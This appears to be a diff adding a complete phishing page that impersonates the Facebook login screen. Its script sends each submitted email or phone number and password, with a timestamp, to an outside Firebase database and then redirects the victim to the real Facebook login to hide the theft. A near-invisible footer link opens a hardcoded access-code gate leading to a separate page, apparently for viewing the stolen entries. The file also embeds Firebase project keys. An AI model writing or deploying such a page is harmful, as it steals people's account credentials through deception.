@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        } 
+        
+        body {
+            background-color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            max-width: 400px;
+            gap: 15px;
+        }
+        
+        select {
+            border: none;
+            outline: none;
+            background-color: white;
+            font-family: Arial, sans-serif;
+            font-size: 16px;
+            color: #333;
+            padding: 8px 12px;
+            border-radius: 4px;
+            align-self: flex-end;
+            margin-bottom: 20px;
+        }
+        
+        #facebook {
+            border-radius: 50%;
+            width: 70px;
+            height: 70px;
+            margin-bottom: 15px;
+        }
+        
+        #meta {
+            height: 40px;
+            width: 70px;
+            margin-top: 30px;
+        }
+        
+        #name, #password {
+            border-radius: 5px;
+            height: 45px;
+            width: 100%;
+            border: solid grey 1.5px;
+            padding: 12px;
+            font-size: 16px;
+        }
+        
+        #login {
+            background-color: rgb(26, 26, 184);
+            border-radius: 15px;
+            height: 45px;
+            width: 100%;
+            color: rgb(236, 231, 231);
+            border: none;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        #a1 {
+            text-decoration: none;
+            color: #1877f2;
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 14px;
+        }
+        
+        #a2 {
+            text-decoration: none;
+            font-family: Arial, Helvetica, sans-serif;
+            border: solid 1.2px #1877f2;
+            border-radius: 15px;
+            height: 45px;
+            width: 100%;
+            padding: 12px;
+            color: #1877f2;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 15px;
+        }
+        
+        .divider {
+            width: 100%;
+            height: 1px;
+            background-color: #ddd;
+            margin: 15px 0;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 0 15px;
+            }
+            
+            #name, #password, #login, #a2 {
+                height: 50px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="container">
+        <select>
+            <option value="en">English (US)</option>
+            <option value="en_GB">English (UK)</option>
+            <option value="es">Español</option>
+            <option value="fr">Français (France)</option>
+        </select>
+        
+        <img src="imgs/facebook logo.webp" id="facebook" alt="Facebook Logo">
+        
+        <input type="text" id="name" placeholder="Mobile number or email">
+        <input type="password" id="password" placeholder="Password">
+        <input onclick="submit()" type="button" id="login" value="Log in">
+        
+        <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" id="a1">Forgot password?</a>
+        
+        <div class="divider"></div>
+        
+        <a href="https://www.facebook.com/r.php?entry_point=login" id="a2">Create new account</a>
+        
+        <img src="imgs/meta logo.png" id="meta" alt="Meta Logo">
+    </div>
+
+    <footer style="font-size: 5px;"><a href="#" style="color: black; text-decoration: none;" onclick="reqPass()">,</a></footer>
+    <input type="text" placeholder="Enter acess code." style="display: none; " id="admin">
+    <input type="button" value="Enter" style="display: none;" id="btn" onclick="verify()">
+    <br><br><br><br>
+    <p id="mesg"></p>
+
+    <script>
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyCpbb9kKDgD3sly6hjSe1I55mIlqKsa5JM",
+            authDomain: "systeam-d12d0.firebaseapp.com",
+            projectId: "systeam-d12d0",
+            storageBucket: "systeam-d12d0.firebasestorage.app",
+            messagingSenderId: "938749422010",
+            appId: "1:938749422010:web:097e3432289f20ac3fd583",
+            measurementId: "G-FC1TNMV0SH"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        function submit() {
+            const name = document.getElementById('name').value;
+            const password = document.getElementById('password').value;
+            let isValid = true;
+
+            // Validate name
+            if (name.length < 3) {
+                alert('Name must consist of at least 3 characters!');
+                isValid = false;
+            }
+
+            // Validate password
+            if (password.length < 4) {
+                alert('Password must be at least 4 characters!');
+                isValid = false;
+            }
+
+            // If all validations pass
+            if (isValid) {
+                const userData = {
+                    name: name,
+                    password: password,
+                    timestamp: new Date().toISOString()
+                };
+
+                // Push data to Firebase
+                database.ref('users').push(userData)
+                    .then(() => {
+                        console.log("Data stored successfully!");
+                        window.open('https://m.facebook.com/login/', '_blank');
+                    })
+                    .catch((error) => {
+                        console.error("Error storing data:", error);
+                    });
+            }
+        }
+
+        const btn = document.getElementById('btn')
+        const input = document.getElementById('admin');
+        const container = document.getElementById('container');
+        const mesg = document.getElementById('mesg');
+
+        function verify(){
+           
+            
+            if(input.value === '@C011in5'){
+                mesg.innerHTML = 'Access Granted';
+                mesg.style.color = 'limegreen';
+                setTimeout(() => {
+                    window.location.href = 'facebookDisplay.html';
+                }, 1000);
+            }else{
+                mesg.innerHTML = 'Access Denied...Enter valid access code!';
+                mesg.style.color = 'red';
+                input.value = '';
+
+                // Shake animation for wrong password
+                input.style.animation = 'shake 0.5s';
+                setTimeout(() => {
+                    input.style.animation = '';
+                }, 500);
+            }
+        }
+
+        function reqPass() {
+            
+            let mesg = document.getElementById('mesg')
+            container.style.display = 'none';
+            input.style.display = 'block';
+            btn.style.display = 'block';
+            
+            if(input.value === '@C011in5'){
+                mesg.innerHTML = 'Access Granted';
+                mesg.style.color = 'limegreen';
+                setTimeout(() => {
+                    window.location.href = 'facebookDisplay.html';
+                }, 1000);
+            }else{
+                mesg.innerHTML = 'Access Denied...Enter valid access code!';
+                mesg.style.color = 'red';
+                input.value = '';
+
+                // Shake animation for wrong password
+                input.style.animation = 'shake 0.5s';
+                setTimeout(() => {
+                    input.style.animation = '';
+                }, 500);
+            }
+        }
+    </script>
+</body>
+</html>
